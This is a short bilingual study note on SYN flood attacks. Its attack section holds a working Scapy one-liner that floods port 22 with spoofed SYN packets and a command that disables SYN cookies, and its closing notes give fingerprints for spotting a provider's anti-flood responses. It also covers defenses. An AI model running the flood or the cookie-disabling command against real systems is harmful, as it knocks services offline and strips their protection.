# SYN Flood Attack
A SYN flood attack is a form of denial-of-service attack in which an attacker rapidly initiates a connection to a server without finalizing the connection. 

The malicious client can either simply not send the expected `ACK`, or by spoofing the source IP address in the `SYN`, cause the server to send the `SYN-ACK` to a falsified IP address – which will not send an `ACK` because it "knows" that it never sent a `SYN`.[^wiki]

## Attack
1. Nmap 扫描可连接端口
2. `echo 0 > /proc/sys/net/ipv4/tcp_syncookies`
3. Scapy
   ```python
   send(IP(src=RandIP(), dst='10.0.0.8') / TCP(sport=RandShort(), dport=22, flags='S'), loop=1)
   ```

[ACK-PSH-RST-SYN Flood | Knowledge Base | MazeBolt](https://kb.mazebolt.com/knowledgebase/ack-psh-rst-syn-flood/)

## Defenses
 [^linoxide]
- Filtering
- Increasing backlog
  ```sh
  cat /proc/sys/net/ipv4/tcp_max_syn_backlog
  ```
- Reducing SYN-RECEIVED timer
  ```sh
  cat /proc/sys/net/ipv4/tcp_synack_retries
  ```
- Recycling the oldest [half-open TCP](https://en.wikipedia.org/wiki/TCP_half-open "TCP half-open")
- SYN cache
- [SYN cookies](https://en.wikipedia.org/wiki/SYN_cookies)
  
  Instead of storing additional connections, a SYN queue entry is encoded into the **sequence number** sent in the `SYN-ACK` response. If the server then receives a subsequent `ACK` response from the client with the incremented sequence number, the server is able to reconstruct the SYN queue entry and proceed as usual with the connection.

  SYN cookies are now deployed in most major operating systems.
  
  ```sh
  cat /proc/sys/net/ipv4/tcp_syncookies
  ```
- Hybrid approaches
- Firewalls and proxies

[云彩网络](https://www.7yc.com/):
- 检测为攻击时会返回伪造的 SYN ACK，而不是忽略或 RST
- 当客户端发送 SYN ECN CWR 时，伪造的 SYN ACK 会包含 ECN CWR，而真实的 Windows SYN ACK 只会包含 ECN

  伪造的 SYN ACK window 为 8760，而真实的为 65535
- 伪造的 SYN ACK 不含 options，而真实的 Options: (12 bytes), Maximum segment size, No-Operation (NOP), Window scale, No-Operation (NOP), No-Operation (NOP), SACK permitted
- 伪造的 SYN ACK Conversation completeness 为 47，而真实的为 31

[Windows 10 drops incoming TCP SYN packet for no reason - Microsoft Community](https://answers.microsoft.com/en-us/windows/forum/all/windows-10-drops-incoming-tcp-syn-packet-for-no/2245ca28-b82f-415a-8d4f-56afbf38b1a5?page=1)


[^wiki]: [SYN flood - Wikipedia](https://en.wikipedia.org/wiki/SYN_flood)
[^linoxide]: [What is SYN Flood Attack? Detection & Prevention in Linux](https://linoxide.com/snapshot-syn-flood-attack/)